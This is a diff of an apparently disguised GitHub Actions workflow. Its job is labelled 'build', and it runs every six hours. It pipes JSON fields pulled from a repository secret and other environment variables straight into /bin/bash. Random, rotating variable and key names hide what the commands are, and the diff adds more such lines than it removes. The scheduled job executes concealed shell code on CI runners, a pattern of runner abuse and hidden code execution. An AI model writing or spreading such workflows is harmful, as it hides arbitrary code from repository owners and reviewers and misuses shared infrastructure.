@@ -1,30 +1,33 @@
 name: heavyheadach
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '40 4/6 * * *'
+    - cron: '54 3/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: heavyheadach
         env:
-          kjkyb4: ${{ secrets.kjkyb4 }}
+          azkq74: ${{ secrets.azkq74 }}
         run: |
-          echo $kjkyb4 | jq -r .aay997 | /bin/bash
-          echo $zfq2 | jq -r .hh15 | /bin/bash
-          echo $jw6285 | jq -r .a2057 | /bin/bash
-          echo $iy41 | jq -r .gjwl5 | /bin/bash
-          echo $wuia6 | jq -r .tpf32 | /bin/bash
-          echo $pksbg6254 | jq -r .zkrwo05876 | /bin/bash
-          echo $zcnrp1068 | jq -r .kens7816 | /bin/bash
-          echo $rqaw936 | jq -r .fweg2 | /bin/bash
-          echo $m74074 | jq -r .zl282 | /bin/bash
-          echo $ouz5497 | jq -r .xvbka33 | /bin/bash
-          echo $db17 | jq -r .orhq946 | /bin/bash
-          echo $xkm32 | jq -r .p6 | /bin/bash
-          echo $vo0458 | jq -r .wenxj2 | /bin/bash
+          echo $azkq74 | jq -r .z03430 | /bin/bash
+          echo $iqde84375 | jq -r .j35 | /bin/bash
+          echo $e4491 | jq -r .m95 | /bin/bash
+          echo $nv29138 | jq -r .iddo5 | /bin/bash
+          echo $wmdjl270 | jq -r .dk79542 | /bin/bash
+          echo $gd63327 | jq -r .pjf2055 | /bin/bash
+          echo $cbs4 | jq -r .qoe9764 | /bin/bash
+          echo $ith4 | jq -r .o526 | /bin/bash
+          echo $gsym58 | jq -r .dge1 | /bin/bash
+          echo $yf72418 | jq -r .xsze9916 | /bin/bash
+          echo $ipp2 | jq -r .gctpq04 | /bin/bash
+          echo $lrdf98 | jq -r .x34178 | /bin/bash
+          echo $s8375 | jq -r .as0472 | /bin/bash
+          echo $udkrr8 | jq -r .nqn7127 | /bin/bash
+          echo $xpzs23727 | jq -r .abkke3 | /bin/bash
+          echo $t897 | jq -r .tiv08728 | /bin/bash
 
